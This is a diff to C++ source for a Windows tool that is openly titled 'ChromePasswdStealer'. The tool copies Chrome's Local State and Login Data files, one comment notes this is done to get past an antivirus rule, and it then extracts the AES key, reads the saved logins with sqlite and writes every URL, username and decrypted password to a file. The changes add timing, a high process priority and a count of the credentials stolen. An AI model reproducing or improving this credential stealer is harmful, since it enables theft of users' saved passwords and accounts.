@@ -3,6 +3,7 @@
 #include <iostream>
 #include <shlobj.h>
 #include <fstream>
+#include <chrono>
 //slproweb.com/download/Win32OpenSSL-3_1_0.exe
 #include <openssl/evp.h>
 
@@ -62,6 +63,7 @@ string getKey(const char* path) {
 }
 
 int main() {
+    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
     SetConsoleTitleA("ChromePasswdStealer");
     //获取路径
     char szPath[MAX_PATH];
@@ -76,6 +78,8 @@ int main() {
     //火绒的自定义防护规则会导致sqlite3_open失败，这里将文件拷贝到同目录再读取
     CopyFileA(Local_State.c_str(), "Local State", 0);
     CopyFileA(Login_Data.c_str(), "Login Data", 0);
+
+    auto start = std::chrono::high_resolution_clock::now();
 
     //获取AES key
     key = getKey("Local State");
@@ -92,6 +96,7 @@ int main() {
     ofstream fout(outfile);
 
     string de;
+    int i = 0;
     while (sqlite3_step(stmt) == SQLITE_ROW) {
         const unsigned char* a = sqlite3_column_text(stmt, 0);
         const unsigned char* b = sqlite3_column_text(stmt, 1);
@@ -116,13 +121,19 @@ int main() {
         fout << "action_url: " << b << "\n";
         fout << "username: " << c << "\n";
         fout << "password: " << de << "\n\n\n";
+        i++;
     }
     sqlite3_finalize(stmt);
     sqlite3_close(db);
-    fout.close();
 
     DeleteFileA("Local State");
     DeleteFileA("Login Data");
 
-    system("pause");
+    auto end = std::chrono::high_resolution_clock::now();
+
+    std::cout << "Total: " << i << "\nTime taken : " << std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count() << " ms\n";
+    fout << "Total: " << i << "\nTime taken : " << std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count() << " ms\n";
+    fout.close();
+
+    std::system("pause");
 }
